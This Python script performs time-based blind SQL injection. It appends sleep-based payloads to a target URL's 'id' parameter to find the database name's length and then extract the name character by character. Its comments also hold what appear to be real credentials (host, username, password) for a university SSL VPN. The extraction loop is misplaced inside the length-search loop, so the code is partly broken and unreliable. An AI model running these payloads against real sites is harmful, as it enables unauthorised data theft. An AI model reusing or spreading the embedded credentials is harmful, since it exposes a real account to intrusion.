import requests
import sys
import string
#info:sslvpn.swjtu.edu.cn
#username:2016044855
#passwd:swjtu2022
url = sys.argv[1]

def timeout(url):
    try:
        res = requests.get(url,timeout=3)
        return res.text
    except Exception as e:
        return "timeout"

dbnamelen = 0
while True:
    dbnamelen +=1
    dbnamelenurl = url+"?id=1'+and+if(length(database())="+str(dbnamelen)+",sleep(5),1)--+"
    print(dbnamelenurl)
    if "timeout" in timeout(dbnamelenurl):
        print("the len of dbname:"+str(dbnamelen))
        break

    if dbnamelen == 30:
        print("error!")
        break

    dbname = ""
    for i in range(1,dbnamelen+1):
        for char in string.ascii_lowercase:
            dbnameurl = url+"?id=1'+and+if(substr(database(),"+str(i)+",1)='"+char+"',sleep(5),1)--+"

            if "timeout" in timeout(dbnameurl):
                dbname +=char
                print(dbname)
                break
